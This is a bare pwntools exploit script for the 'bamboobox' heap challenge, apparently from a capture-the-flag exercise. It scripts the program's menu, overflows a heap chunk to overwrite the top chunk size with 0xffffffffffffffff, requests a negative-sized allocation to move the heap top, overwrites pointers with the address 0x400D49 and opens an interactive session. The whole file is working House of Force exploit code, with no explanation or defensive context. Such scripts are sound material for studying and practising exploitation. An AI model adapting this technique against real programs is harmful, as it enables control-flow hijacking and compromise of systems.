from pwn import *

r = process('./bamboobox')
context.log_level = 'debug'


def additem(length, name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def modify(idx, length, name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


def show():
    r.recvuntil(":")
    r.sendline("1")

additem(0x80,'AAAAAAAA')
payload = 'A'*0x88+p64(0xffffffffffffffff)
modify(0,len(payload),payload)
additem(-0xb8,'A')
additem(16,p64(0x400D49)*2)

r.interactive()
